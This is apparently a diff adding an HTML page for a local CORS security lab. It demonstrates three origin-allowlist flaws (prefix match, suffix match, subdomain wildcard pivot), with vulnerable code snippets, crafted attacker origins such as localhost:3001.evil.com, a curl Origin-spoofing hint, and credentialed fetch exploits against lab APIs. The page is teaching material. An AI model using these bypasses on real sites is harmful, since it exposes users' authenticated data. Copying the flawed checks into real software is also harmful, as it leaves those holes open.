@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Ex 02 — Regex & Subdomain Bypasses</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Courier New', monospace; background: #0a0e1a; color: #e0e6f0; padding: 2rem; }
+    h1 { color: #ff3c3c; margin-bottom: 0.25rem; }
+    .subtitle { color: #6272a4; font-size: 0.85rem; margin-bottom: 2rem; }
+    .scenario { background: #1a1225; border: 1px solid #9945ff44; border-left: 4px solid #9945ff; padding: 1rem 1.25rem; border-radius: 6px; font-size: 0.82rem; line-height: 1.6; margin-bottom: 1.5rem; color: #c0b0e0; }
+    .attack-card { background: #111827; border: 1px solid #1f2d3d; border-radius: 8px; padding: 1.25rem; margin-bottom: 1.25rem; }
+    .attack-card h2 { font-size: 0.95rem; color: #ff6b6b; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.6rem; }
+    .badge { background: #ff3c3c22; border: 1px solid #ff3c3c44; color: #ff6b6b; font-size: 0.68rem; padding: 0.15rem 0.5rem; border-radius: 3px; }
+    .explanation { font-size: 0.8rem; color: #6272a4; line-height: 1.6; margin-bottom: 0.75rem; }
+    .code-compare { display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-bottom: 0.75rem; }
+    .code-block { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 0.6rem 0.75rem; font-size: 0.73rem; }
+    .code-block .label { font-size: 0.7rem; color: #8b949e; margin-bottom: 0.3rem; }
+    .code-block .bad { color: #ff6b6b; }
+    .code-block .good { color: #3fb950; }
+    .bypass-demo { background: #0d1117; border: 1px solid #f0c93a33; border-radius: 4px; padding: 0.6rem 0.75rem; font-size: 0.75rem; margin-bottom: 0.75rem; color: #8b949e; }
+    .bypass-demo .attack-origin { color: #f0c93a; }
+    button { background: #ff3c3c22; border: 1px solid #ff3c3c66; color: #ff6b6b; padding: 0.45rem 1.2rem; border-radius: 4px; cursor: pointer; font-size: 0.82rem; font-family: inherit; margin-right: 0.5rem; margin-bottom: 0.25rem; }
+    button:hover { background: #ff3c3c33; }
+    .output { background: #0d1117; border-radius: 4px; padding: 0.75rem; font-size: 0.75rem; min-height: 90px; white-space: pre-wrap; word-break: break-all; margin-top: 0.75rem; color: #6272a4; border: 1px solid #21262d; }
+    .flag { background: #2d2a00; border: 1px solid #f0c93a55; color: #f0c93a; padding: 0.5rem 0.75rem; border-radius: 4px; margin-top: 0.5rem; font-weight: bold; }
+    code { background: #1f2d3d; padding: 0.1rem 0.35rem; border-radius: 3px; font-size: 0.85em; }
+  </style>
+</head>
+<body>
+  <h1>Exercise 02 — Regex & Subdomain Bypasses</h1>
+  <div class="subtitle">Bugs #4, #5, #6 — when "almost correct" allowlists fail</div>
+
+  <div class="scenario">
+    <strong>Pattern:</strong> The developer tried to write an origin allowlist using string matching.
+    Each attempt has a subtle flaw that lets a crafted origin slip through. These are some of the
+    most common real-world CORS misconfigurations found in bug bounty programs.
+  </div>
+
+  <!-- BUG #4: Prefix bypass -->
+  <div class="attack-card">
+    <h2><span class="badge">BUG #4</span> Prefix Match Bypass</h2>
+    <div class="explanation">
+      The server checks <code>origin.startsWith('http://localhost:3001')</code>. An attacker
+      registers a domain that starts with the trusted string. The check passes. The server
+      reflects it back with credentials allowed.
+    </div>
+    <div class="code-compare">
+      <div class="code-block">
+        <div class="label">Vulnerable code (cors-config.js)</div>
+        <div class="bad">if (origin.startsWith('http://localhost:3001'))</div>
+      </div>
+      <div class="code-block">
+        <div class="label">Attack origins that pass</div>
+        <div class="good">http://localhost:3001<br><span style="color:#f0c93a">http://localhost:3001.evil.com ✓</span><br><span style="color:#f0c93a">http://localhost:30010 ✓</span></div>
+      </div>
+    </div>
+    <div class="bypass-demo">
+      We'll spoof the Origin header to: <span class="attack-origin">http://localhost:3001.evil.com</span><br>
+      (fetch doesn't allow header spoofing — see note in output)
+    </div>
+    <button onclick="exploitPrefix()">▶ Exploit prefix bypass → /api/transfers</button>
+    <div class="output" id="prefix-output">Click to run...</div>
+  </div>
+
+  <!-- BUG #5: Suffix bypass -->
+  <div class="attack-card">
+    <h2><span class="badge">BUG #5</span> Suffix Match Bypass</h2>
+    <div class="explanation">
+      The server checks <code>origin.endsWith('bank.local')</code> to allow any bank subdomain.
+      But <code>evilbank.local</code> also ends with <code>bank.local</code>.
+    </div>
+    <div class="code-compare">
+      <div class="code-block">
+        <div class="label">Vulnerable code (cors-config.js)</div>
+        <div class="bad">if (origin.endsWith('bank.local'))</div>
+      </div>
+      <div class="code-block">
+        <div class="label">Attack origins that pass</div>
+        <div class="good">http://reports.bank.local<br><span style="color:#f0c93a">http://evilbank.local ✓</span><br><span style="color:#f0c93a">http://notabank.local ✓</span></div>
+      </div>
+    </div>
+    <button onclick="exploitSuffix()">▶ Request /api/statements from our origin</button>
+    <div class="output" id="suffix-output">Click to run...</div>
+  </div>
+
+  <!-- BUG #6: Subdomain wildcard -->
+  <div class="attack-card">
+    <h2><span class="badge">BUG #6</span> Subdomain Wildcard Trust Pivot</h2>
+    <div class="explanation">
+      The server trusts all <code>*.bank.local</code> subdomains, including
+      <code>localhost:3001</code> (which simulates <code>reports.bank.local</code>).
+      If an attacker compromises <em>any</em> trusted subdomain (XSS, subdomain takeover),
+      they can read the admin API using that subdomain's trusted-origin status.
+    </div>
+    <div class="bypass-demo">
+      The trusted subdomain server at <code>http://localhost:3001</code> has a <code>/pivot-page</code>
+      endpoint that simulates this attack from the browser. Click below to open it — watch it
+      fetch <code>/api/admin</code> using its trusted origin status.
+    </div>
+    <button onclick="window.open('http://localhost:3001/pivot-page', '_blank')">
+      ▶ Open pivot-page on trusted subdomain (localhost:3001)
+    </button>
+    <button onclick="exploitSubdomain()">▶ Test if /api/admin accepts our origin directly</button>
+    <div class="output" id="subdomain-output">Click a button to run...</div>
+  </div>
+
+  <script>
+    // Bug #4 — prefix bypass
+    // Note: browsers don't allow fetch() to set a spoofed Origin header.
+    // The actual bypass would be done from a server at that domain, or via curl.
+    // We test what the server does with our real origin, and explain the bypass.
+    async function exploitPrefix() {
+      const el = document.getElementById('prefix-output');
+      el.style.color = '#6272a4';
+      el.textContent =
+        '⚠️  Browser Note: fetch() does not allow spoofing the Origin header.\n' +
+        'In a real attack, the exploit comes from a server literally hosted at\n' +
+        'http://localhost:3001.evil.com — which browsers send automatically.\n\n' +
+        'Testing with our real origin (' + window.location.origin + ')...\n\n';
+
+      try {
+        const res = await fetch('http://localhost:3000/api/transfers', { credentials: 'include' });
+        const acao = res.headers.get('access-control-allow-origin');
+        const data = await res.json();
+        el.style.color = '#f0c93a';
+        el.textContent +=
+          'Our origin was: ' + window.location.origin + '\n' +
+          'ACAO returned:  ' + acao + '\n\n' +
+          'The prefix check code: origin.startsWith("http://localhost:3001")\n' +
+          'localhost:3002 does NOT start with "http://localhost:3001" — so if\n' +
+          'you can read data here, the route has a different issue.\n\n' +
+          'To see the real bypass: curl with -H "Origin: http://localhost:3001.evil.com"\n\n' +
+          'Response:\n' + JSON.stringify(data, null, 2);
+        if (data.flag) {
+          const f = document.createElement('div'); f.className = 'flag';
+          f.textContent = '🚩 FLAG: ' + data.flag;
+          el.after(f);
+        }
+      } catch (err) {
+        el.style.color = '#3fb950';
+        el.textContent += 'Blocked from our origin: ' + err.message;
+      }
+    }
+
+    // Bug #5 — suffix bypass
+    async function exploitSuffix() {
+      const el = document.getElementById('suffix-output');
+      el.style.color = '#6272a4';
+      el.textContent =
+        'Our origin is: ' + window.location.origin + '\n' +
+        'Does it end with "bank.local"? ' + (window.location.origin.endsWith('bank.local') ? 'YES' : 'NO') + '\n\n' +
+        'Fetching /api/statements...\n';
+
+      try {
+        const res = await fetch('http://localhost:3000/api/statements', { credentials: 'include' });
+        const acao = res.headers.get('access-control-allow-origin');
+        const data = await res.json();
+        el.style.color = '#ff6b6b';
+        el.textContent += 'ACAO: ' + acao + '\nResponse:\n' + JSON.stringify(data, null, 2);
+        if (data.flag) {
+          const f = document.createElement('div'); f.className = 'flag';
+          f.textContent = '🚩 FLAG: ' + data.flag;
+          el.after(f);
+        }
+      } catch (err) {
+        el.style.color = '#3fb950';
+        el.textContent += '✅ Blocked: ' + err.message + '\n\nThe suffix check correctly rejected our origin.';
+      }
+    }
+
+    // Bug #6 — subdomain pivot (test from our untrusted origin)
+    async function exploitSubdomain() {
+      const el = document.getElementById('subdomain-output');
+      el.style.color = '#6272a4';
+      el.textContent =
+        'Testing if /api/admin accepts our untrusted origin...\n' +
+        'Our origin: ' + window.location.origin + '\n\n';
+
+      try {
+        const res = await fetch('http://localhost:3000/api/admin', { credentials: 'include' });
+        const acao = res.headers.get('access-control-allow-origin');
+        const data = await res.json();
+        el.style.color = '#ff6b6b';
+        el.textContent +=
+          'ACAO: ' + acao + '\n\n' +
+          'If you got data here, the wildcard is broader than expected.\n' +
+          'The real pivot is from localhost:3001 — click the pivot-page button above.\n\n' +
+          JSON.stringify(data, null, 2);
+        if (data.flag) {
+          const f = document.createElement('div'); f.className = 'flag';
+          f.textContent = '🚩 FLAG: ' + data.flag;
+          el.after(f);
+        }
+      } catch (err) {
+        el.style.color = '#8be9fd';
+        el.textContent +=
+          'Our origin is correctly rejected: ' + err.message + '\n\n' +
+          '✅ The subdomain check blocks us (localhost:3002).\n' +
+          'But localhost:3001 IS trusted — open the pivot-page to see the real attack.\n' +
+          'That simulates what happens when reports.bank.local is compromised.';
+      }
+    }
+  </script>
+</body>
+</html>
